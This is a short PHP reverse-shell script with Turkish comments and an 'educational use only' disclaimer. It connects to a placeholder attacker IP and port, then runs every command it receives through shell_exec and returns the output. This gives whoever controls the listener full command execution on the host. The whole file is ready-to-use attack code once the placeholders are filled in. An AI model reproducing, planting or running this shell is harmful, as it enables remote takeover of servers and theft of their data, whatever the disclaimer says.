<?php
$ip = 'SALDIRI_HEDEF_IP'; // Target IP address
$port = SALDIRI_HEDEF_PORT; // Target port number

// Create a TCP socket connection to the target IP and port
$shell = stream_socket_client("tcp://$ip:$port");

if ($shell) {
    while (!feof($shell)) {
        // Read command from the socket
        $cmd = fgets($shell);
        // Execute the command
        $output = shell_exec($cmd);
        // Send the output back to the socket
        fwrite($shell, $output);
    }
    // Close the socket connection
    fclose($shell);
}
# Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
# Produced by Kamil Umut Araz
?>
